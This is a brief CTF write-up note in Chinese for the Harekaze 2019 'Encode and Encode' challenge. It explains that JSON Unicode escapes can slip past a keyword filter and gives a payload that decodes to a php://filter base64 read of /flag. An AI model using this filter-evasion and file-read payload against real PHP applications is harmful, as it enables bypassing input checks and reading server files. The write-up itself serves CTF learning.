# WP
[https://github.com/swv-l/writeups/blob/master/2019-harekaze-encode-and-encode.md](https://github.com/swv-l/writeups/blob/master/2019-harekaze-encode-and-encode.md)
# 知识点
`json`支持适用`unicode`进行转义<br />所以`payload`如下
```json
{"page":"\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067","5vcqh7vy7fi":"="}
```
